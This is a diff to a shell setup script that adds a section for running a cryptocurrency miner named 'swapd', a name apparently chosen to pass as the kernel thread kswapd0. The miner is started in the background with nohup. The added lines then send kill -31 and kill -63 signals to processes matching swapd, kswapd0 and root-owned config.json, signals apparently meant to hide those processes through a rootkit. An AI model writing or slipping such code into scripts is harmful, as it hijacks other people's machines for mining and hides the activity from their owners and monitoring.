@@ -604,4 +604,27 @@ systemctl status swapd
 systemctl start swapd
 systemctl status swapd
 
+# Running the miner
+if [ ! -x "$HOME/.swapd/swapd" ]; then
+  echo "Miner executable not found or not executable"
+  exit 1
+fi
+
+echo "Starting swapd miner..."
+# Detail the command to ensure it uses the correct config
+nohup $HOME/.swapd/swapd --config=$HOME/.swapd/config.json > $HOME/.swapd/miner.log 2>&1 &
+
+# Confirm it is running
+if pgrep -f "swapd" > /dev/null; then
+  echo "swapd is running successfully."
+else
+  echo "Failed to start swapd."
+fi
+
+kill -31 $(pgrep -f -u root config.json)
+kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
+kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+
 echo "[*] Setup complete"
